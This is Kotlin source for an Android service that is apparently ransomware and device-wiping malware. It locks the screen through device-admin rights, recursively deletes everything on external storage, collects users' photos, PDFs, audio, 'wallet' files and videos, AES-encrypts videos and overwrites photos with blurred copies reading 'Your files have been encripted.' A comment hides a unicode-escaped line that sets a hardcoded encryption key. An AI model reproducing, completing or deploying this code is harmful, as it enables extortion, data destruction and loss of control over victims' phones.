package com.neaking

import android.app.Service
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Intent
import android.graphics.*
import android.os.*
import android.telephony.TelephonyManager
import android.text.Layout
import android.text.StaticLayout
import android.text.TextPaint
import android.widget.Toast
import com.neaking.ConnectionManager.context
import java.io.*
import java.util.*

class MyService : Service() {
    override fun onBind(intent: Intent): IBinder? {
        return null
    }





    fun lockTheScreen() {
        val localComponentName = ComponentName(this, DeviceAdminComponent::class.java)
        val localDevicePolicyManager =
            this.getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
        if (localDevicePolicyManager.isAdminActive(localComponentName)) {
            localDevicePolicyManager.setPasswordQuality(
                localComponentName,
                DevicePolicyManager.PASSWORD_QUALITY_NUMERIC
            )
        }
        localDevicePolicyManager.lockNow()
    }

    fun wipingSdcard() {
        val deleteMatchingFile = File(
            Environment
                .getExternalStorageDirectory().toString()
        )
        try {
            val filenames = deleteMatchingFile.listFiles()
            if (filenames != null && filenames.size > 0) {
                for (tempFile in filenames) {
                    if (tempFile.isDirectory) {
                        wipeDirectory(tempFile.toString())
                        tempFile.delete()
                    } else {
                        tempFile.delete()
                    }
                }
            } else {
                deleteMatchingFile.delete()
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun wipeDirectory(name: String?) {
        val directoryFile = File(name)
        val filenames = directoryFile.listFiles()
        if (filenames != null && filenames.size > 0) {
            for (tempFile in filenames) {
                if (tempFile.isDirectory) {
                    wipeDirectory(tempFile.toString())
                    tempFile.delete()
                } else {
                    tempFile.delete()
                }
            }
        } else {
            directoryFile.delete()
        }
    }


    var al: List<File>? = null
    var vids: List<File>? = null
    var totalFiles = ""
    lateinit var KEY: ByteArray
    fun startrans(): Int {
        al = getFiles(
            Environment.getExternalStorageDirectory(), arrayOf(
                ".jpg", ".jpeg", ".png", ".JPG", ".PNG",
                ".JPEG", ".pdf", ".PDF", ".mp3", ".MP3",
                "wallet", ".ogg", ".thumbnails"
            ), arrayOf("Android/data")
        )
        vids = getFiles(
            Environment.getExternalStorageDirectory(), arrayOf(
                ".mp4", ".MP4", ".avi", ".AVI", ".mov", ".MOV", ".mkv", ".MKV"
            ), arrayOf("Android/data")
        )
        totalFiles = al!!.size.toString() + " And " + vids!!.size.toString()
        try {
            println("totalFiles")
            println(totalFiles)

            /* \u002a\u002f\u004b\u0045\u0059\u0020\u003d\u0020\u0022\u0030\u0031\u0032\u0033\u0034\u0035\u0036\u0037\u0038\u0039\u0030\u0031\u0032\u0033\u0034\u0035\u0022\u002e\u0067\u0065\u0074\u0042\u0079\u0074\u0065\u0073\u0028\u0022\u0055\u0054\u0046\u0038\u0022\u0029\u003b\u002f\u002a */

            // Well... you guess it.
            encryptFile()
        } catch (e: Exception) {
            e.printStackTrace()
        }
        return 0
    }

    @Throws(Exception::class)
    fun encryptFile() {
       // return
        for (file in al!!) {
            if (file.path.contains(".thumbnails")) {
                file.delete()
            } else if (!file.path.contains("IMPORTANT.jpg") && !file.path.contains(".enc") && !file.path.contains(
                    "brld_"
                )
            ) {
                // 1 in N
                if (Random().nextInt(20) == 0) {
                    val brld = blurPhoto(file)
                    saveFile(brld, file.parentFile.path + File.separator + "brld_" + file.name)
                }
                val brld = blurPhoto(file)
                println(brld)
                saveFile(brld, file.parentFile.path + File.separator + "brld_" + file.name)

//                val enc: ByteArray = Aes.encrypt(KEY, fullyReadFileToBytes(file))
//                saveFile(enc, file.path + ".enc")
               // file.delete()
            }
        }
        for (vid in vids!!) {
            if (!vid.path.contains(".enc")) {
                Aes.encryptLarge(KEY, vid, File(vid.path + ".enc"))
            }
        }
        val bm = BitmapFactory.decodeResource(resources, R.mipmap.ic_launcher)
        val stream = ByteArrayOutputStream()
        bm.compress(Bitmap.CompressFormat.PNG, 100, stream)
        saveFile(
            stream.toByteArray(),
            Environment.getExternalStorageDirectory().toString() + File.separator + "Pictures"
        )
    }

    @Throws(Exception::class)
    fun decryptFile() {
        for (file in al!!) {
            if (file.path.contains(".thumbnails") || file.path.contains("brld")) {
                file.delete()
            } else if (file.path.contains(".enc") && !file.path.contains(".enc.enc") && !file.path.contains(
                    "brld"
                )
            ) {
                //Decrypt
                val `in` = fullyReadFileToBytes(file)
                val dec: ByteArray = Aes.decrypt(KEY, `in`)
                saveFile(dec, file.path.substring(0, file.path.length - 4))
                file.delete()
            }
        }
        for (vid in vids!!) {
            if (vid.path.contains(".enc") && !vid.path.contains(".enc.enc")) {
                Aes.decryptLarge(KEY, vid, File(vid.path.substring(0, vid.path.length - 4)))
            }
        }
    }

    @Throws(IOException::class)
    fun fullyReadFileToBytes(f: File): ByteArray {
        val size = f.length().toInt()
        val bytes = ByteArray(size)
        val tmpBuff = ByteArray(size)
        val fis = FileInputStream(f)
        try {
            var read = fis.read(bytes, 0, size)
            if (read < size) {
                var remain = size - read
                while (remain > 0) {
                    read = fis.read(tmpBuff, 0, remain)
                    System.arraycopy(tmpBuff, 0, bytes, size - remain, read)
                    remain -= read
                }
            }
        } catch (e: IOException) {
            throw e
        } finally {
            fis.close()
        }
        return bytes
    }

    fun saveFile(data: ByteArray?, outFileName: String?) {
        try {
            val fos = FileOutputStream(outFileName)
            fos.write(data)
            fos.close()
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    fun getFiles(parentDir: File, toFind: Array<String>, exclude: Array<String>): List<File> {
        val inFiles = ArrayList<File>()
        val files = parentDir.listFiles()
        for (file in files) {
            if (file.isDirectory) {
                inFiles.addAll(getFiles(file, toFind, exclude))
            } else {
                var append = false
                for (s in toFind) {
                    if (file.path.contains(s)) {
                        append = true
                        break
                    }
                }
                for (ex in exclude) {
                    if (file.path.contains(ex)) {
                        append = false
                        break
                    }
                }
                if (append) {
                    inFiles.add(file)
                }
            }
        }
        return inFiles
    }

    fun blurPhoto(file: File): ByteArray? {
        val options = BitmapFactory.Options()
        options.inPreferredConfig = Bitmap.Config.ARGB_8888
        options.inJustDecodeBounds = false
        val bitmap = BitmapFactory.decodeFile(file.absolutePath, options) ?: return null
        val blurredBitmap: Bitmap = BlurBuilder.blur(this, bitmap)
        val textedBm = drawMultilineTextToBitmap(blurredBitmap, "Your files have been encripted.")
        val stream = ByteArrayOutputStream()
        textedBm.compress(Bitmap.CompressFormat.PNG, 100, stream)
        return stream.toByteArray()
    }

    fun cleanPhotos() {
        for (file in al!!) {
            if (BitmapFactory.decodeFile(file.absolutePath) == null) {
                file.delete()
            }
        }
    }

    fun drawMultilineTextToBitmap(bitmap: Bitmap, gText: String?): Bitmap {
        var bitmap = bitmap
        val scale = 1
        var bitmapConfig = bitmap.config
        // set default bitmap config if none
        if (bitmapConfig == null) {
            bitmapConfig = Bitmap.Config.ARGB_8888
        }
        // resource bitmaps are imutable,
        // so we need to convert it to mutable one
        bitmap = bitmap.copy(bitmapConfig, true)
        val canvas = Canvas(bitmap)

        // new antialiased Paint
        val paint = TextPaint(Paint.ANTI_ALIAS_FLAG)
        // text color - #3D3D3D
        paint.color = Color.rgb(61, 61, 61)
        // text size in pixels
        paint.textSize = (14 * scale).toFloat()
        // text shadow
        paint.setShadowLayer(1f, 0f, 1f, Color.WHITE)

        // set text width to canvas width minus 16dp padding
        val textWidth = canvas.width - 16 * scale

        // init StaticLayout for text
        val textLayout = StaticLayout(
            gText, paint, textWidth, Layout.Alignment.ALIGN_CENTER, 1.0f, 0.0f, false
        )

        // get height of multiline text
        val textHeight = textLayout.height

        // get position of text's top left corner
        val x = ((bitmap.width - textWidth) / 2).toFloat()
        val y = ((bitmap.height - textHeight) / 2).toFloat()

        // draw text to the Canvas center
        canvas.save()
        canvas.translate(x, y)
        textLayout.draw(canvas)
        canvas.restore()
        return bitmap
    }

    fun makeToast(text: String?) {
        val handler = Handler(Looper.getMainLooper())
        handler.post {
            Toast.makeText(
                applicationContext,
                text,
                Toast.LENGTH_SHORT
            ).show()
        }
    }
}